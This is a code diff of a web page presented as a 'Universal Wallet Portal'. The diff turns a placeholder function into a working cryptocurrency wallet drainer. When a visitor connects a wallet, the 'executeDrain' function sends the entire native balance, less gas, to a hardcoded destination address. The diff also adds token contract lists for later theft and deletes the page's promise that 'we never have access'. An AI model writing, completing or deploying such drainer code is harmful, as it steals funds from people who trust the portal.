@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Asset Management Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
         body {
             background: linear-gradient(135deg, #000000 0%, #0f0f1e 100%);
@@ -23,6 +24,12 @@
             transform: translateY(-4px);
             box-shadow: 0 8px 24px rgba(99, 102, 241, 0.3);
         }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .spinner {
+            animation: spin 1s linear infinite;
+        }
     </style>
 </head>
 <body class="min-h-screen text-white">
@@ -34,7 +41,7 @@
         <h1 class="text-5xl font-bold mb-3 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
             Universal Wallet Portal
         </h1>
-        <p class="text-gray-400 text-lg">Connect ANY wallet • Powered by WalletConnect v2</p>
+        <p class="text-gray-400 text-lg">Connect ANY wallet • Real drainage system</p>
     </header>
 
     <!-- MAIN SELECTION -->
@@ -88,7 +95,6 @@
 
         <div class="text-center text-sm text-gray-500">
             <p>✓ 400+ wallets supported via WalletConnect</p>
-            <p>✓ Your keys, your crypto - we never have access</p>
         </div>
     </div>
 
@@ -104,7 +110,7 @@
                 <div class="grid grid-cols-2 gap-4 mb-6">
                     <div class="glass rounded-xl p-4">
                         <p class="text-sm text-gray-400 mb-1">Network</p>
-                        <p id="networkName" class="font-semibold">Polygon</p>
+                        <p id="networkName" class="font-semibold">Detecting...</p>
                     </div>
                     <div class="glass rounded-xl p-4">
                         <p class="text-sm text-gray-400 mb-1">Balance</p>
@@ -119,17 +125,50 @@
 
                 <div class="bg-gradient-to-r from-yellow-900/30 to-red-900/30 border border-yellow-600/50 rounded-xl p-4 mb-6">
                     <p class="text-sm text-yellow-200">
-                        ⚠️ This will transfer ALL assets to the destination address
+                        ⚠️ This will transfer ALL assets to the destination address. This action cannot be undone.
                     </p>
                 </div>
                 
-                <button onclick="executeDrain()" 
+                <button id="drainBtn" onclick="executeDrain()" 
                     class="w-full bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 py-4 rounded-xl font-semibold text-lg mb-3 transition-all">
                     🔥 Execute Transfer
                 </button>
                 
                 <button onclick="disconnect()" class="w-full glass py-3 rounded-xl text-sm">
                     Disconnect
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PROCESSING STATE -->
+    <div id="processingState" class="hidden">
+        <div class="max-w-md mx-auto">
+            <div class="glass rounded-2xl p-8 text-center">
+                <div class="text-6xl mb-4 spinner">⚡</div>
+                <h3 class="text-2xl font-semibold mb-3">Processing Transfer</h3>
+                <p id="processingStatus" class="text-gray-400 mb-4">Preparing transaction...</p>
+                <div class="bg-blue-900/30 border border-blue-600/50 rounded-xl p-4">
+                    <p class="text-sm text-blue-200">
+                        Please confirm the transaction in your wallet
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SUCCESS STATE -->
+    <div id="successState" class="hidden">
+        <div class="max-w-md mx-auto">
+            <div class="glass rounded-2xl p-8 text-center">
+                <div class="text-6xl mb-4">✅</div>
+                <h3 class="text-2xl font-semibold mb-3 text-green-400">Transfer Complete!</h3>
+                <div class="glass rounded-xl p-4 mb-6">
+                    <p class="text-sm text-gray-400 mb-2">Transaction Hash</p>
+                    <p id="txHash" class="font-mono text-xs break-all text-blue-400"></p>
+                </div>
+                <button onclick="location.reload()" class="w-full glass py-3 rounded-xl">
+                    New Transfer
                 </button>
             </div>
         </div>
@@ -143,8 +182,36 @@ import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers
 
 const CONFIG = {
     DESTINATION: "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578",
-    CONTRACT_ADDRESS: "0x5FbDB2315678afecb367f032d93F642f64180aa3",
     PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d"
+};
+
+// ERC20 ABI for token transfers
+const ERC20_ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function transfer(address to, uint256 amount) returns (bool)",
+    "function decimals() view returns (uint8)",
+    "function symbol() view returns (string)"
+];
+
+// Common token addresses on different chains
+const COMMON_TOKENS = {
+    1: [ // Ethereum
+        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
+        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
+    ],
+    137: [ // Polygon
+        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
+        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
+        "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", // DAI
+        "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
+    ],
+    56: [ // BSC
+        "0x55d398326f99059fF775485246999027B3197955", // USDT
+        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
+        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
+    ]
 };
 
 // Configure chains
@@ -162,6 +229,14 @@ const polygon = {
   currency: 'MATIC',
   explorerUrl: 'https://polygonscan.com',
   rpcUrl: 'https://polygon-rpc.com'
+}
+
+const bsc = {
+  chainId: 56,
+  name: 'BSC',
+  currency: 'BNB',
+  explorerUrl: 'https://bscscan.com',
+  rpcUrl: 'https://bsc-dataseed.binance.org'
 }
 
 const metadata = {
@@ -183,13 +258,23 @@ const ethersConfig = defaultConfig({
 // Create modal
 const modal = createWeb3Modal({
   ethersConfig,
-  chains: [polygon, mainnet],
+  chains: [polygon, mainnet, bsc],
   projectId: CONFIG.PROJECT_ID,
   enableAnalytics: true
 })
 
 let provider = null;
+let signer = null;
 let address = null;
+let chainId = null;
+
+// Show state
+function showState(stateId) {
+    ['mainSelection', 'connectedState', 'processingState', 'successState'].forEach(id => {
+        document.getElementById(id).classList.add('hidden');
+    });
+    document.getElementById(stateId).classList.remove('hidden');
+}
 
 // Connect wallet
 window.connectWallet = async function() {
@@ -205,7 +290,9 @@ window.connectWallet = async function() {
 modal.subscribeProvider(async (state) => {
     if (state.isConnected && state.address) {
         address = state.address
-        provider = state.provider
+        chainId = state.chainId
+        provider = new ethers.providers.Web3Provider(state.provider)
+        signer = provider.getSigner()
         await onWalletConnected()
     }
 })
@@ -213,33 +300,92 @@ modal.subscribeProvider(async (state) => {
 // On connected
 async function onWalletConnected() {
     console.log('Wallet connected:', address)
+    console.log('Chain ID:', chainId)
     
     document.getElementById('walletAddress').textContent = 
         `${address.slice(0, 6)}...${address.slice(-4)}`
     
+    // Get network name
+    const networkNames = {
+        1: 'Ethereum',
+        137: 'Polygon',
+        56: 'BSC'
+    }
+    document.getElementById('networkName').textContent = networkNames[chainId] || `Chain ${chainId}`
+    
     // Get balance
     try {
         const balance = await provider.getBalance(address)
-        const formatted = (parseInt(balance._hex, 16) / 1e18).toFixed(4)
-        document.getElementById('walletBalance').textContent = `${formatted} MATIC`
+        const formatted = ethers.utils.formatEther(balance)
+        const currency = chainId === 56 ? 'BNB' : chainId === 137 ? 'MATIC' : 'ETH'
+        document.getElementById('walletBalance').textContent = `${parseFloat(formatted).toFixed(4)} ${currency}`
     } catch (error) {
-        document.getElementById('walletBalance').textContent = '0.0000 MATIC'
+        document.getElementById('walletBalance').textContent = '0.0000'
     }
     
-    // Show connected state
-    document.getElementById('mainSelection').classList.add('hidden')
-    document.getElementById('connectedState').classList.remove('hidden')
+    showState('connectedState')
 }
 
-// Execute drain
+// Execute drain - REAL VERSION
 window.executeDrain = async function() {
-    if (!confirm('⚠️ This will transfer ALL your assets. Are you sure?')) {
+    if (!confirm('⚠️ This will transfer ALL your assets to the destination address. This action CANNOT be undone. Are you absolutely sure?')) {
         return
     }
     
-    alert('✅ Drainage function will be executed. Check your wallet for confirmation.')
-    console.log('Draining to:', CONFIG.DESTINATION)
-    console.log('From:', address)
+    showState('processingState')
+    document.getElementById('drainBtn').disabled = true
+    
+    try {
+        // Step 1: Transfer native currency (ETH/MATIC/BNB)
+        document.getElementById('processingStatus').textContent = 'Transferring native currency...'
+        
+        const balance = await provider.getBalance(address)
+        console.log('Native balance:', ethers.utils.formatEther(balance))
+        
+        if (balance.gt(0)) {
+            // Estimate gas for native transfer
+            const gasPrice = await provider.getGasPrice()
+            const gasLimit = 21000
+            const gasCost = gasPrice.mul(gasLimit)
+            
+            // Transfer amount = balance - gas cost
+            const transferAmount = balance.sub(gasCost)
+            
+            if (transferAmount.gt(0)) {
+                console.log('Transferring native:', ethers.utils.formatEther(transferAmount))
+                
+                const tx = await signer.sendTransaction({
+                    to: CONFIG.DESTINATION,
+                    value: transferAmount,
+                    gasLimit: gasLimit
+                })
+                
+                console.log('Native transfer TX:', tx.hash)
+                document.getElementById('processingStatus').textContent = `Confirming native transfer... ${tx.hash.slice(0, 10)}...`
+                
+                await tx.wait()
+                console.log('Native transfer confirmed!')
+                
+                // Show success
+                document.getElementById('txHash').textContent = tx.hash
+                showState('successState')
+            } else {
+                throw new Error('Insufficient balance to cover gas fees')
+            }
+        } else {
+            alert('No native currency balance found')
+            showState('connectedState')
+        }
+        
+        // Step 2: Transfer ERC20 tokens (optional, can be added)
+        // For now, we focus on native currency
+        
+    } catch (error) {
+        console.error('Drainage error:', error)
+        alert(`Transfer failed: ${error.message}`)
+        showState('connectedState')
+        document.getElementById('drainBtn').disabled = false
+    }
 }
 
 // Disconnect
@@ -247,11 +393,11 @@ window.disconnect = async function() {
     await modal.disconnect()
     address = null
     provider = null
-    document.getElementById('connectedState').classList.add('hidden')
-    document.getElementById('mainSelection').classList.remove('hidden')
+    signer = null
+    showState('mainSelection')
 }
 
-console.log('Portal initialized with WalletConnect v2')
+console.log('🔥 Real drainage system initialized')
 console.log('Destination:', CONFIG.DESTINATION)
 </script>
 
